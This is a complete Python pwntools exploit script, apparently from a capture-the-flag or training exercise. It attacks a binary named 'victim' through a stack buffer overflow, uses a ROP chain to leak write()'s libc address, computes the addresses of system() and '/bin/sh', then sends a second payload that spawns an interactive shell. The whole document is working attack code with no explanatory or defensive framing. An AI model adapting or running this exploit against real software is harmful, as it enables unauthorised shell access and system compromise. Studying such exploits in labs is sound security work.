#!/usr/bin/env python
from pwn import *

libc = ELF('libc.so.6')
elf = ELF('victim')

p = process('./victim')
#p = remote('127.0.0.1',10001)

pop_ret_addr=0x0000000000400693
pop_pop_pop_ret_addr=0x00000000004006d4
main_addr = 0x00000000004005f0

plt_write = elf.symbols['write']
print 'plt_write= ' + hex(plt_write)
got_write = elf.got['write']
print 'got_write= ' + hex(got_write)

payload1 = 'A'*136
payload1 += p64(pop_pop_pop_ret_addr)
payload1 += p64(0x1)
payload1 += p64(got_write)
payload1 += p64(0x8)
payload1 += p64(plt_write)
payload1 += p64(main_addr)

#print p.recv()
print "\n###sending payload1 ...###"
p.send(payload1)
#print (payload1)
print "\n###receving write() addr...###"
write_addr = u64(p.recv(8))
print 'write_addr=' + hex(write_addr)

print "\n###calculating system() addr and \"/bin/sh\" addr...###"
system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
print 'system_addr= ' + hex(system_addr)
binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
print 'binsh_addr= ' + hex(binsh_addr)

payload2 = 'A'*136
payload2 += p64(pop_ret_addr)
payload2 += p64(binsh_addr)
payload2 += p64(system_addr)
payload2 += p64(main_addr)


print "\n###sending payload2 ...###"
p.send(payload2)

p.interactive()
